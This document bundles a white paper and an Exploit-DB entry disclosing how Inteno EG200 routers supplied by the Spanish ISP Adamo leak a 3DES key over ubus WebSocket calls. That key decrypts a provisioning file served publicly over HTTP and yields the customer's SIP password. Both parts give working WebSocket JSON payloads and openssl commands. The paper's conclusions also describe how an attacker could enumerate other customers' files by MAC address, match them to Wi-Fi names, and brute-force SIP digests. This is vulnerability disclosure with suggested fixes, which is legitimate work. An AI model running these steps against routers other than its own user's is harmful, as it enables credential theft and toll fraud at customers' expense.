=== Content from twitter.com_8c50ea5b_20250121_003656.html ===



=== Content from www.exploit-db.com_7bcbf6bb_20250121_003658.html ===
Call your key to phone all

Gerard Fuguet (gerard@fuguet.cat)

Abstract

Internet Service Providers (ISP), delivers connection to the digital world and brings extra
services  like  VoIP  and  other  technologies  which  internet  is  the  main  requirement.  To
ensure their quality and capabilities, the equipment is delivered by them, limited in most
of the times to avoid disruption and unnecessary support. Most ISP restricts the telephony
service  to  be  used  with  other  devices,  with  the  impossibility  to  expand  their
functionalities.  The processes that we focus on this white paper is to acquire the VoIP
parameters to take advantage of it.

We  will  demonstrate  how  to  extract  the  password  parameter  from  the  provisioning
mechanism  used  by  Adamo  Telecom  Iberia  S.A.U.  (Spanish  ISP).  This  situation
motivated me to write it.

The intention is that ISP‚Äôs takes consciousness facilitating these parameters for any user
who request it.

1

Table of Contents

1. Motivation ................................................................................................. 3

2. The Router ................................................................................................. 4

2.1. Software .............................................................................................. 6

2.1.1. IOPSYS (Inteno Open Platform System) ..................................... 6

2.1.2. WebSockets client ......................................................................... 7

2.2. Hardware ........................................................................................... 12

3. Encryption over plain Channel................................................................ 12

3.1. The .enc-rypted file ........................................................................... 13

3.1.1. Algorithm Mechanism ................................................................ 14

3.2. 3DES-encryption ............................................................................... 15

4. Hack your Provisions .............................................................................. 16

5. Conclusions ............................................................................................. 20

6. References ............................................................................................... 24

2

1. Motivation
For personal reasons, this year I changed of ISP, moving from Movistar to Adamo. One
thing that  I  wanted to  continue having is  the VoIP service that  comes by  default with
Movistar on FTTH (Fiber to The Home) [1]. I could configure it on other devices with no
problem.

Before to stay sure of the change, I asked some questions to the salesperson; is possible
use the telephone service in, for example, my computer? Salespersons said: Yes, you can
(and yeah, was right! But not in an easy way) ‚Ä¶

After close the negotiation with the new ISP and technicians installed the new devices in
my home, I started my first research with the help of ‚Äúmy google friend‚Äù. First stop was
a forum/site called Banda Ancha [2]. There is a Post with the parameters of the VoIP [3]
but it isn‚Äôt explained how to get the password. In another Post, there is a method to access
to  the  router  as  admin  due  to  a  vulnerability  of  misconfigured  ACLs  [4]  but  this  was
already patched.

Next stop was do some ‚Äúsniffing‚Äù [5] between the router and ONT with a TAP, I used the
Throwing Star LAN Tap Pro [6].

Figure 1: Sniffing with the Throwing Star LAN Tap Pro TAP

I could capture the SIP digest authentication using Wireshark sniffing in both interfaces:

3

HACKERFiberONTINTERNETTAP192.168.1.0/24LANWANWANTRUNKTRUNK

Figure 2: Capturing the digest authentication in Wireshark

Third  stop  was  trying  to  get  lucky  calling  to  Adamo‚Äôs  support  doing  some  social
engineering tactics to know little more about the password‚Äôs characteristics.

In the call, technician said is composed by 8 digits, but is not authorized to describe it is
alphanumerical  (a-z,  A-Z,  0-8),  if  has  some  special  character‚Ä¶  The  length  of  the
password has sense because when you sign up with them, they send an SMS informing
of the URL for consulting your bills. In this case, the user is 6 digit, all numbers (same as
the user of the SIP) and the password is 8 digit alphanumerical, so maybe we can try using
Brute  Force  technics  with  sipcrack  [7]  +  crunch  [8]  to  do  a  cracking  on  the  fly  for
example or if you have good GPU (or more!) you could get luck guessing with hashcat
(using the 11400  Hash-Mode according to  their wiki  [9]). This  is  a possible option to
obtain it, I don‚Äôt like this methodology at all, in my experience, cracking by Brute Force
usually  fails because  you need ‚Äúforce‚Äù  and a little of  ‚Äúluck‚Äù, like a casino‚Ä¶ You can
deposit tons of money by losing all at the end. Do you want to take the risk? How much
time are you willing to lose? (You decide!).

At the end of the telephone conversation with technician, he said:

-  Exist other methods to obtain the SIP password, you need search on Internet and

knowing about this materia/IT.

-  Really? This was first thing that I did! OK I will try :D .

At this point, I was full of energy to achieve my objective, my mission, take the SIP‚Äôs
password yes or yes. Let the challenge start!

2. The Router
The phone, RJ-11 connector only way, connects to the router, so we need get focus on
this device.

Adamo started offering: ONT ZHONE 2426

But we are interesting on the new model (basically, because I have only one, and seems
the previous model is no longer delivered). We are talking about the: Inteno DG200A-AC

In the official support page of Adamo, exist a manual [10] but nothing about the specs.
The brand is Inteno, and seeing the datasheet, seems the model of the support webpage

4

of Adamo is not according with our model! [11]. We don‚Äôt have secondary port of RJ-11
neither ADSL port. Our model is EG200 [12], by the characteristics seems to be identical,
only changes the number of ports. Checking the comparison table at the following Figure
3:

Figure 3: Comparison key elements between DG200 vs EG200 models

According this, EG200 has one Gigabit in WAN section and one FXS in Voice section,
but rest of hardware seems identical, same characteristics.

5

2.1. Software
Inteno router‚Äôs runs IOPSYS and is based on OpenWRT [13]:

Figure 4: Shell of an Inteno DG200 device

In Figure 4 we can observe a shell showing IOPSYS version and the OpenWrt base. With
this knowledge, we could try to put some commands, but apparently this is not possible
because we saw above in chapter 1 was patched, however, this doesn‚Äôt mean there is no
more exploits to try!

2.1.1. IOPSYS (Inteno Open Platform System)
Even  IOPSYS  [14]  is  based  on  OpenWRT,  it  works  little  different  when  the  frontend
(JUCI) wants to communicate with the backend, owsd [15] webserver is the intermediate
before packets arrives to ubus [16].

6

Figure 5: System overview of IOPSYS

At Figure 5, we can observe 3 differentiated layers.

Red layer is the frontend part, GUI application who initiates the communication.

Orange layer acts as framework API to transport petitions through WebSockets.

Brown is final layer who receive the petition and acts/respond delivering info or doing
proper actions depending on the registered procedures.

OK, communication through the WebSockets ‚Äúbackdoor‚Äù sounds good, but how can we
start with?

2.1.2. WebSockets client
The person who exploited it playing under ‚Äúthis language‚Äù is Neonsea [17]. I found out
about the first Inteno‚Äôs vulnerability on Banda Ancha forum (viewed in chapter 1 of this
paper). A CVE (CVE-2017-11361) was assigned with a high score [18]. But this is not
the only one, there were more reached [19]:

1. 07/17/2017 ‚Äì [CVE-2017-11361] - Inteno routers have a JUCI ACL misconfiguration
that allows the "user" account to read files, write to files, and add root SSH keys via JSON
commands to ubus. (Exploitation is sometimes easy because the "user" password might
be "user" or might match the Wi-Fi key.).

2. 12/23/2017 ‚Äì [CVE-2017-17867] - Inteno iopsys 2.0-3.14 and 4.0 devices allow remote
authenticated users to execute arbitrary OS commands by modifying the leasetrigger field

7

in  the  odhcpd  configuration  to  specify  an  arbitrary  program,  as  demonstrated  by  a
program  located  on  an  SMB  share.  This  issue  existed  because  the  /etc/uci-defaults
directory was not being used to secure the OpenWrt configuration.

3. 04/15/2018 ‚Äì [CVE-2018-10123] - p910nd on Inteno IOPSYS 2.0 through 4.2.0 allows
remote attackers to read, or append data to, arbitrary files via requests on TCP port 9100.

4. 07/21/2018 ‚Äì [CVE-2018-14533] - read_tmp and write_tmp in Inteno IOPSYS allow
attackers to gain privileges after writing to /tmp/etc/smb.conf because /var is a symlink
to /tmp.

5. 12/26/2018 ‚Äì [CVE-2018-20487] - An issue was discovered in the firewall3 component
in Inteno IOPSYS 1.0 through 3.16. The attacker must make a JSON-RPC method call to
add a firewall rule as an "include" and point the "path" argument to a malicious script or
binary. This gets executed as root when the firewall changes are committed.

Is enough information that denotes excellent expertise ‚Äúabusing‚Äù the ubus WebSocket
communication  making  JSON  calls.  To  achieve  it,  we  need  the  ‚Äútrick‚Äù  of  use  same
language or protocol  using a WebSocket  client  [18]. Neonsea uses websocket  through
python in the exploit PoC‚Äôs, is a good option but I want to try with something that can
makes and undo the changes in a comfortable way.

A tool that I like fuzzing with requests is curl. In the ubus wiki, curl must be used with
the help of a plugin [16]. It doesn‚Äôt work, so other tool is needed to do the correct ‚Äújob‚Äù.

As this is moves under a web environment, I related it with browser, so looking for a
client  for  the  developer  console  I  find  a  suitable  and  flexible  way.  It  explains  with
examples in a MDN web docs [20]. For understand the flow of the WebSocket process
from the beginning on router, the behavior can be observed in the developer tools at login
page.

8

Figure 6: GET request at login‚Äôs router and script with WebSocket function

In Figure 6, at the top of the image, there is the first request containing some scripts to
execute. The responsible of the WebSocket function is 01-juci.js script file. Opening in
notepad++ the host in WS protocol is the IP of the router.

Note: As curiosity, the parameter v with the value of some numbers (?v=1560472390) is
the time in Unix format. So this value can be whatever numbers.

At following Figure 7, the protocol is switching to accept talking under WebSockets:

9

Figure 7: Switching to WS at login‚Äôs page

It means is ready to accept the WebSocket protocol.

We  can  use  our  commands  in  the  following  way  under  the  console  of  the  developer's
tools:

1. Creating the socket with the corresponding protocol.

var superSocket = new WebSocket("ws://192.168.1.1/", "ubus-json")

2. Log, show the responses on every message sent.

superSocket.onmessage = function (event) {console.log(event.data)}

3. Requesting a session id doing a login with the standard (and only) user that can access
to the router.

superSocket.send(JSON.stringify({"jsonrpc":"2.0","method":"call","params":["000000
00000000000000000000000000","session","login",{"username":"user","password":"w
ifis-password"}],"id":0}))

10

The answer contains the session id under the parameter ‚Äúubus_rpc_session‚Äù and from
this point, we will use it in every new petition.

Figure 8: Obtaining the session id

To  get  a  fast  picture  of  the  flow  communication  using  the  Firefox  browser,  we  did  a
simplified diagram:

Figure 9: WebSocket communication flow using a browser

I have a good ‚Äútoy‚Äù, I have many things to interact with. As we have seen at the top of
the chapter 2.1.2. Neonsea did a very good job discovering all these vulnerabilities, so,
with so much, I'm sure there will always be one that works, isn't it? Well, it's going to be
not :( . All tried failed‚Ä¶ even using the python scripts. Seems Inteno wins ‚Äúthis match‚Äù.
CVE‚Äôs had been patched.

Under manual mode with the Firefox‚Äôs console, the answers were:

{‚Äújsonrpc‚Äù:‚Äú2.0‚Äù,‚Äúid‚Äù:1,‚Äúresult‚Äù:[6]}

That according to ubus architecture page [16] means that is a valid jsonrpc response, 6
code may can be related or well to an access denied or that the session is expired.

This was a very frustrated moment. We came "fighting" methodically and when another
"wall" stops you, give up is an option, but for me, is my last option‚Ä¶ I know is not easy
and I prefer to have my SIP password now, retrieving in a manual/tutorial mode or in
some internet forum but this is not the case, if so, I would not be writing this now. I want
to write these ‚Äúinstructions‚Äù, and hope ISP‚Äôs writes them too.

11

Firefox(console)owsd(WS)UBUS

2.2. Hardware
In theory, this option is the only working solution for these cases. I read experiences how
many users had luck opening the device housing for entering via serial mode, connecting
directly on the router's motherboard. Remembering the router is based on OpenWrt [13]
we could take a look on the modes [21]. Via USB-TTL seems to be the most common
method for nowadays devices of this type.

A photo  of the motherboard was taken, because  I didn‚Äôt find  a photo  of the inside on
internet.

Figure 10: Inside of Inteno‚Äôs EG200

I  haven‚Äôt  experience,  I  never  disassembly  a  device  like  that  (experience  in  opening
electronic devices, a little, if you are interested in opening this model, you must remove
the four pads from the sides and their screws that are hidden there) to operate by console
mode, so decided to rearm it and continue searching for a network method.

3. Encryption over plain Channel
Taking step to back, I realized of an HTTP plain request that trying to get a file with .enc
extension.

12

Figure 11: HTTP, GET request of the .enc file

This is the only HTTP request captured between router and ONT. Above, in Figure 11,
the  GET  request  retrieves  the  XXXXXXXXXXXX.enc  where  XXXXXXXXXXXX  is  the
MAC address of your router in capital letters and without the colon. The User-Agent is
the actual firmware of the router ending with :UBIFS. The full request URI in order to
acquire the file is: http://inteno-provisioning.adamo.es/XXXXXXXXXXXX.enc and can be
retrieved publicly, it is serving from an Adamo server internet exposed facing.

In inspection process, we could not interpret the content, since it was about an encrypted
file‚Ä¶

3.1. The .enc-rypted file
There is no doubt this file may hides a valuable ‚Äúsecret‚Äù that Inteno & Adamo don‚Äôt want
us to know, but, we are very adventurous and we will follow the track until we solve the
riddle.

Under Wireshark, we search the .enc string in packet bytes, and exist a relation with the
DHCP/BOOTP protocol:

13

Figure 12: URI + .enc in DHCP/BOOTP protocol

The option 128 of the DCHP/BOOTP protocol is present and invokes the .enc file with
the following URI: http://inteno-provisioning.adamo.es/$MAC.enc .Interesting‚Ä¶ Is the
same URI as can be observed in Figure 11, but the name of the file .enc is called $MAC.
It has all the characteristics to be a variable that router‚Äôs resolves as the MAC of itself as
can be seen in chapter 3.

3.1.1. Algorithm Mechanism
Doing more research, I found a manual of the device XG6846 [22] from the DNA [23] (a
Finnish  telecommunications  company).  At  page  10  of  the  manual,  it  explains  that  the
XML can be encrypted using 3DES. At page 54, there is a table with examples to retrieve
the file in  encryption or plain mode. The number 128 is the type of option we saw in
Figure 12.

Going back to page 10, it talks about some keys: It says ‚Äú3DES keys can be retrieved
from your Inteno logistics or from your Inteno sales contact.‚Äù Very interesting‚Ä¶ Maybe
I can request to Adamo give to me, but if they didn‚Äôt deliver my SIP key, nor it has no
sense that deliver me this type of ‚Äúmaster‚Äù key, right?

But‚Ä¶ one moment, I saw something about ‚Äúdes‚Äù in some place‚Ä¶

While playing with WebSockets, one of the request about showing the info of the router
system, we obtain 3 keys: wpa is well knows, auth and des, the latter, is the one that can
be useful to us‚Ä¶

14

Figure 13: Getting the 3DES key via WebSockets

Figure 13 shows the request and the answer with the info of three keys, one of them is the
des, but, will be that key that really make reference to 3DES?

3.2. 3DES-encryption
The  tool  used  for  the  encryption  process,  seems  to  be  openssl  and  the  key  must  be
converted to hexadecimal with this command (seen on XG6846 manual):

echo $1 | xxd ‚Äìp

Where  $1  is  the  key  to  convert.  Once  key  is  converted  to  HEX,  the  full  command  to
encrypt has this aspect:

openssl enc -e -des-ede -nosalt -K $KEY -iv "0000000000000000" -in $2 -out $3

The -out gives you encrypted file.

Now, the dilemma is in the decryption process. Is openssl, again, the right tool for this?
The person who can give us an answer is Daniel Vindev√•g [24].

He build a free website service to decrypt the .enc file if you already have the key. If you
add .txt at the end of the URI you can see the source code [24]. And the command for
decryption:

openssl enc -d -des-ede -nosalt -K $key -in $encrypted_file -out $decrypted_file

Is very similar like in the manual of  XG6846, the only differences is the  -d parameter
instead of -e and the missing -iv.

In the process of the decryption .enc file with 3DES key on Daniel‚Äôs website, output points
to a .txt extension. And he retrieved the des key from the router in the following URL:
http://192.168.1.1/xmlprov.html [25] but since an update of 2016-04-30 seems no longer
working/accessible.

We decided to do some trial & error with the 3DES key we found using WebSockets. We
use the tool to convert to HEX from the XG6846 manual [22] and then we use the entire
command from the Daniel‚Äôs site [24].

The .txt extension file is still illegible and the command didn't throw any error, so‚Ä¶ what
is wrong here?

Finally we check if the extension of the file is really a .txt or we are talking about of other
type of file format.

15

Using a HEX editor like notepad++ with his respective plugin, it is appreciated that file
starts with: 1F 8B and according to: List of file signatures of Wikipedia [26] It was a file
with tar.gz extension!

4. Hack your Provisions
If you are an Adamo user, I know that you are really desiring to get that SIP password
(As I had too!). This is the practical part of the paper, so don‚Äôt worry, I'll get to the point
in this section ;) . Before moving faster, let‚Äôs take an overview under a diagram about this
hack.

Figure 14: Overview of the hacking process

You are acting as router‚Äôs owner (or hacker). The .enc key can be got from an external
network (different of Adamo‚Äôs ISP), but the file will be unreadable if you do not have

16

inteno-provisioning.adamo.es91.126.224.22TCP: 80TCP: 80WANLANXXXXXXXXXXXX.enc + KEY = .tar.gz ‚Üí  Provisioning.confXXXXXXXXXXXX.enc = Understandable ContentKEYRest of the WorldXXXXXXXXXXXX.encRouter s Owner192.168.1.X/24192.168.1.1INTERNETLOCAL

access to the router with the corresponding MAC (the name of the file must be match
with the MAC of your router). Otherwise, the key to decrypt won't work.

Let‚Äôs Start!

0. First of all, is important to show the environment where the PoC was tested.

Figure 15: Showing the OS version of Kali Linux

Step 1: Let's see what type of ‚Äúfish‚Äù we collected.

1. After doing a MitM (Man-in-the-Middle) between the router and ONT as seen in Figure
1 of the chapter 1, we open the .pcap file looking for the provisioning URL.

Figure 16: Opening the captured file

2. The .enc file is retrieved using the wget tool and the parameter -U to use the same User-
Agent  observed  in  the  capture  (in  this  case,  is  the  firmware  of  the  router  ending  with
:UBIFS).

Figure 17: Getting the .enc file with wget tool

Step 2: Help the key ‚Äúcalling to it‚Äù.

1. Let‚Äôs open router‚Äôs page with Firefox.

17

Figure 18: Opening router‚Äôs login page

2. Entering to Developer Tools pressing F12 key for use the console.

Figure 19: Opening Firefox Developer Tools

3. Let‚Äôs communicate by Sockets. Create a new WebSocket object and then activate the
logs for every request that sends.

Figure 20: Creating the WebSocket and activate logging

4. Let‚Äôs authenticate with the router‚Äôs WiFi in order to acquire a valid session id.

18

5. Retrieve the des key for decrypt .enc file through the info of the router system.

Figure 21: Obtaining a session id

Figure 22: Acquiring the 3DES key

6. They key has 16 digits, but to use it we need convert into HEX before.

Figure 23: Using xxd tool to pass to HEX

Step 3: Stripping it.

1. Let‚Äôs decrypt the file with the help of the openssl tool. -d indicates decryption, -des-
ede  is  two  key  triple  DES  EDE  in  ECB  mode  [27],  -nosalt  salt  is  not  use  in  the  key
derivation routines, -K is key in HEX format, -in the input encrypted file, -out the output
of the decrypted file.

Figure 24: Decrypting the .enc file using openssl

2. The file has a .tar.gz extension, let‚Äôs unzip/untar the file. The result is obtaining the
Provisioning.conf.

3. Let‚Äôs show the content of the Provisioning.conf!

Figure 25: Untar the decrypted file

19

Figure 26: Showing the content of Provisioning.conf

OK, hack process is complete! Happy calling :D . Also, a video is created to show all
these steps in action:

https://youtu.be/uObz1uE5P4s

Note: This video starts doing a mention to people of the Banda Ancha forum (from 00:00
to 00:37 seconds of time). I promised to share the video with them if I succeeded [28].

5. Conclusions
Good and bad news‚Ä¶ Let‚Äôs start for the good one.

We have the SIP password and we have no excuse to expand the  VoIP functionalities,
remember that the rest of the parameters are gained as seen in Figure 2 of the chapter 1,
or you can go to the Banda Ancha forum under a ‚Äúlazy‚Äù situation. (The most important,
of course is the password).

If you are continuing vague and don't want use the WebSockets for getting the 3DES key,
OK, Wireshark can do the job for you:

20

Figure 27: Getting the 3DES key via Wireshark

The steps in this process are:

Start sniffing with Wireshark ‚Üí Login to the router (http://192.168.1.1) ‚Üí Do a proper
filtering on Wireshark: websocket contains ‚Äúboardid‚Äù

We  have  demonstrated  other  ways  to  get  the  ‚Äúmasterpieces  of  the  puzzle‚Äù  (take  it  as
‚ÄúBonus Track‚Äù ;)). It means, the command/calls is triggered without our interaction, in
an unattended form.

Now, the bad news.

We should not be able to "recover" the key using these methods. I really could shut up
and to have my SIP key under my new ‚Äúsecret‚Äù. But do you think this is the good way to
do progress under security perspective? Correct answer is NO!

21

All Adamo‚Äôs users with the VoIP service, must have the rights to have their SIP key, and
the rest of the parameters. If Adamo don‚Äôt want to offer support is OK, there are other
help  on  the  Internet  to  share  most  common  infrastructure  or  other  individual  difficult
ones.  If  Adamo  had  facilitated  me  the  password,  I  would  not  have  gotten  here  (most
probably not). But, thinking about it, I think I must be grateful because the vulnerability
could have resided for some, long time who knows‚Ä¶

The Provisioning.conf is encrypted so‚Ä¶ where is the danger? Well, isn't really enough?
Not at all!

XXXXXXXXXXXX.enc file is available to all people, even on external networks that are
not proprietary of Adamo. We have seen in Figure 14 of the chapter 4 that the 3DES key
for decryption the .enc public file, is protected under the local network of the owner‚Äôs
Adamo‚Äôs user. This is  a  "wall" more level  of protection, but  you need thinking like a
cybercriminal or ‚Äúbad guy‚Äù. An attacker can download the keys maintaining the 3 first
nibbles  of  HEX  of  the  Inteno‚Äôs  MAC  and  guessing  random  numbers  against  the
provisioning server to get all as possible (this can be done more automatically/fastly with
a script). Once the attacker has obtained the provisioning file, he could make long distance
calls at the user's expense... (Spending the user's money). And for the 3DES keys that
matches with the recollected .enc files? The ‚Äúkey‚Äù is to use the WiFi‚Äôs names, SSID or
BSSID (in cases where user changes the Wi-Fi name).

The  2  last  nibbles  of  the  BSSID  or  SSID  of  the  2.4  GHz  band  (if  comes  as  default,
untouched config) is a good guide to identify the correct key to match with .enc file.

The formula of identify: You need add +1 to the MAC of the router (or name of the .enc
file) to find the BSSID that has the correct 3DES key. And at  reverse, from the Wi-Fi
names (SSID), you need -2 (under HEX) to get the correct .enc. If user changes the Wi-
Fi‚Äôs name,  you need focus  on  BSSID, in  this  case,  you need  -1 to  get  the  .enc. So, in
addition:

Finding Wi-Fi BSSID: ********XXXX.enc ‚Üí +1

Finding router‚Äôs MAC/.enc file from default Wi-Fi name: ADAMO-XXXX ‚Üí -2

Finding Wi-Fi default name (SSID) from router‚Äôs MAC/.enc: ********XXXX.enc ‚Üí +2

Finding router‚Äôs MAC/.enc file from default Wi-Fi BSSID/MAC: XXXXXXXXXXXX ‚Üí -
1

Note: This behavior has been observed under the 2.4 Ghz band, the 5 Ghz don‚Äôt follow
this criterion.

Attacker  could  do  a  wardriving  [29]  inspection  and  could  also  try  to  break  the  Wi-Fi
encryption, because WPS is activated by default [10] and this Wi-Fi protocol is insecure.

This can be seen with other ‚Äúeyes‚Äù‚Ä¶ Let's give an accurate ‚Äúgraduation‚Äù for it.

1. The WPS must be disable by default on router, as is well known as insecure protocol.

22

2. The access to the provisioning server must be restricted by the Adamo‚Äôs IP ranges as
minimum.

3. Restrict the access to the provisioning server by User-Agent parameter could also be a
good idea.

4. The provisioning file is encrypted, this is OK, but could be better if packets flows under
HTTPS (doing hard to know what is if intercepted).

5. Encryption file could be acquired via sFTP (secure FTP) doing it more robust.

6. For immediate workaround, user can replace their router, so if is disconnected from the
‚Äúworld‚Äù nobody can retrieve their 3DES key in case someone has them .enc file.

As concluding ending, the Provisioning.conf file, may contains other type of information
that can be used for malicious things, statistics‚Ä¶ this is the firewall package. At Figure
13 of the chapter 3.1.1. There is another type of key which I do not know its purpose, but
my objective was focused entirely on extract my SIP password, because it is a parameter
that belongs to me and I wanted it.

Normally,  there  is  almost  always  a  reason  why  I  do  hacking  tasks,  and  for  now,  my
investigation about Inteno & Adamo ends here.

Hacker  is  always  good  term.  I  do  not  want  to  hurt;  I  want  to  help  and  collaborate
improving the security of devices and infrastructures in order to do a safer digital world
(and/so‚Ä¶ I‚Äôm happy with the Adamo‚Äôs connection!).

I want to give special thanks to:

Banda Ancha members; was the first stop looking for Adamo‚Äôs information and also for
its good reception.

Neonsea; for sharing the discoveries. I learned a lot about the WebSocket communication
protocol.

Daniel Vindev√•g; for reporting the Inteno vulnerabilities and share to the world, including
the decryption mechanism.

Without all of you, this white paper would not have come to light üòä.

Remember‚Ä¶

Be Good, Be Hackers.

23

6. References
[1]
Movistar
combinada/fusion/?switchPrincipal=listado

FTTH

rates.

https://www.movistar.es/particulares/oferta-

[2] Bandaancha.eu; Community of fiber, mobile and ADSL users. https://bandaancha.eu

[3]  Bandaancha.eu;  Config  parameters  of
https://bandaancha.eu/foros/datos-sip-vlan-adamo-1730133

the  connection,

including  VoIP.

[4]  Bandaancha.eu;  Access  to  the  Inteno  router  DG200A-AC  as  admin  step  by  step.
https://bandaancha.eu/foros/acceder-router-inteno-dg200a-ac-paso-1730502

network
[5]  Wireshark;  CaptureSetup/Ethernet.  Capture
https://wiki.wireshark.org/CaptureSetup/Ethernet#Capture_using_a_network_tap

using

a

tap.

Throwing

[6]
https://greatscottgadgets.com/throwingstar/

LAN

Star

Tap

-

Great

Scott

Gasgets.

[7] Sipcrack - A suite of tools to sniff and crack the digest authentications within the SIP.
https://manpages.ubuntu.com/manpages/cosmic/man1/sipcrack.1.html

[8] Crunch | Penetration Testing Tools. https://tools.kali.org/password-attacks/crunch

[9]
https://hashcat.net/wiki/doku.php?id=example_hashes

example_hashes,

Hashcat;

[10]
manual
content/uploads/2016/12/Manual_Inteno_DG200A-Ac.pdf

Router's

adamo.

by

[hashcat

wiki].

https://www.adamo.es/wp-

[11] Inteno; DG200. https://www.intenogroup.com/products/gateways/dg200/

[12] Inteno; EG200. https://www.intenogroup.com/products/gateways/eg200/

[13]
content/uploads/2018/10/Datasheet_EG200.pdf

Datasheet.

EG200

https://www.intenogroup.com/wp-

[14] IOPSYS Product. https://iopsys.eu/product

[15] Inteno; owsd. http://public.inteno.se/owsd.git

[16] Ubus (OpenWrt micro bus architecture). https://openwrt.org/docs/techref/ubus

[17] Twitter | @_neonsea_. https://twitter.com/_neonsea_

[18] Inteno misconfigured ACLs leading to information disclosure and logging in as root.
https://neonsea.uk/blog/2017/07/17/cve-2017-11361.html

[19] Neonsea's blog. https://neonsea.uk/blog/

[20]  Writing  WebSocket
https://developer.mozilla.org/en-
US/docs/Web/API/WebSockets_API/Writing_WebSocket_client_applications

-  Web  APIs

applications

client

|  MDN.

[21]
https://openwrt.org/docs/techref/hardware/port.serial

OpenWrt

Project:

Serial

Console.

24

Configuration

[22]
https://www.dna.fi/documents/753910/853489/XG6846+Configuration+Manual++Rev
E.pdf/bc4ab8b7-b2f6-463c-08a6-d0ff6ec05e00

Manual

RevE

XG6846.

-

[23] DNA Oyj - Wikipedia. https://en.wikipedia.org/wiki/DNA_Oyj

[24] Decrypt Inteno configuration files. http://inteno.vindevag.com/admin.php.txt

[25]
http://www.n√§ttsj√∂.se/fiber/admin.php

√Öterf√•

administrat√∂rsl√∂senordet

p√•

Inteno

FG500.

[26]
of
https://en.wikipedia.org/wiki/List_of_file_signatures

List

file

signatures

-

Wikipedia.

[27]
Symmetric
https://www.openssl.org/docs/manmaster/man1/enc.html

cipher

[28]  Bandaancha.eu;  Cambiar
https://bandaancha.eu/foros/cambiar-router-adamo-ayuda-1735391#r1kvss

de  Adamo

router

por

uno

routines.

neutro.

[29] Wardriving - Wikipedia. https://en.wikipedia.org/wiki/Wardriving

25



=== Content from packetstormsecurity.com_ab9b0ea4_20250121_003655.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

LOCKED OUT‚õî 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.

=== Content from www.exploit-db.com_e5c21080_20250121_003659.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Inteno IOPSYS Gateway - Improper Access Restrictions

#### EDB-ID:

###### 47390

#### CVE:

###### N/A

---

**EDB Verified:**

#### Author:

###### [Gerard Fuguet](/?author=8951)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Hardware](/?platform=hardware)

#### Date:

###### 2019-09-16

---

**Vulnerable App:**

```
# Exploit Title: Inteno IOPSYS Gateway 3DES Key Extraction - Improper Access Restrictions
# Date: 2019-06-29
# Exploit Author: Gerard Fuguet (gerard@fuguet.cat)
# Vendor Homepage: https://www.intenogroup.com/
# Version: EG200-WU7P1U_ADAMO3.16.4-190226_1650
# Fixed Version: EG200-WU7P1U_ADAMO3.16.8-190820_0937
# Affected Component: SIP password, Info Gathering of Network Config
# Attack Type: Remote
# Tested on: Kali Linux 2019.2 against an Inteno EG200 Router
# CVE : CVE-2019-13140

# Description:
Inteno EG200 EG200-WU7P1U_ADAMO3.16.4-190226_1650 and before
firmwares routers have a JUCI ACL misconfiguration that allows
the "user" account to extract the 3DES key via JSON commands to ubus.
The 3DES key is used to decrypt the provisioning file provided by
Adamo Telecom on a public URL via cleartext HTTP.

# Attack Vectors:
To get success on the exploitation, two components are mandatory: 1.
the encrypted file (.enc) and 2. The 3DES key for decrypt it. The
encrypted file can be downloaded via HTTP URL offered by Adamo ISP
(works from any external network). Then is need to interact with the
router using WebSocket protocol to obtain the 3DES key, a web browser
like Firefox can be used as WebSocket client under the developer
tools. Session id is acquired with the same username and password of
the router (in this case, password is the same as wifi defaults). Once
3DES key is obtained through a JSON request command, .enc file can be
decrypted with the help of openssl tool.

# PoC:
Step 1: Getting the provisioning file
Download from http://inteno-provisioning.adamo.es/XXXXXXXXXXXX.enc
Where XXXXXXXXXXXX is your router‚Äôs Inteno MAC, all in capitals and without
the colons. You can also get your MAC by doing a ping to the router
and then an arp command on terminal.
Step 2: The 3DES Key
Let's communcatie by Sockets
- Using Firefox, open the router‚Äôs webpage (192.168.1.1 by default).
- Invoke the developer tools by pressing F12 and go to the Console Tab.
- Let‚Äôs create the WebSocket:
var superSocket = new WebSocket("ws://192.168.1.1/", "ubus-json")
- And creating the Log for show responses in each petition:
superSocket.onmessage = function (event) {console.log(event.data)}
- We request an ID session with the same login parameters that when access
to the router‚Äôs website. (put your wifis router password instead of
wifis-password value):
superSocket.send(JSON.stringify({"jsonrpc":"2.0","method":"call","params":["00000000000000000000000000000000","session","login",{"username":"user","password":"wifis-password"}],"id":666}))
- Now, you will obtain a response, the value of the parameter that says
‚Äúubus_rpc_session‚Äù refers to your session‚Äôs ID, copy it to use in the next
request call.
- Requesting information about the router‚Äôs System. (put your session ID
instead of put-your-session-id-here value):
superSocket.send(JSON.stringify({"jsonrpc":"2.0","method":"call","params":["put-your-session-id-here","router.system","info",{}],"id":999}))
- On the response obtained, copy the value of the ‚Äúdes‚Äù parameter.
It‚Äôs 16 digits that we need convert to hexadecimal.
Step 3: Ready for Decrypting
Convert to HEX using xxd tool where XXXXXXXXXXXXXXXX is your "des" key:
echo -n XXXXXXXXXXXXXXXX | xxd -p
- Use openssl tool to decrypt your provisioning file. (Put your "des" key
instead of your-des-key-in-hex-format value and the XXXXXXXXXXXX
refers the name of your encryption provisioning file, in the -out
value, the name can be different):
openssl enc -d -des-ede -nosalt -K your-des-key-in-hex-format -in XXXXXXXXXXXX.enc -out XXXXXXXXXXXX.tar.gz
- Uncompress the decrypted file:
tar -xzvf XXXXXXXXXXXX.tar.gz
- You get the file: Provisioning.conf.
- Showing the file:
cat Provisioning.conf
- The end of the line refers to the secret, the password of your
SIP account.
A video was created to show all these Steps in action:
https://youtu.be/uObz1uE5P4s

# Additional Information:
A packet sniffer like Wireshark can be used for retrieve the 3DES key
instead of using WebSocket communication protocol. In that case, user
needs to do the login on the router's page, and then the JSON request
containing the 3DES key will be catched.

# References:
https://twitter.com/GerardFuguet/status/1169298861782896642
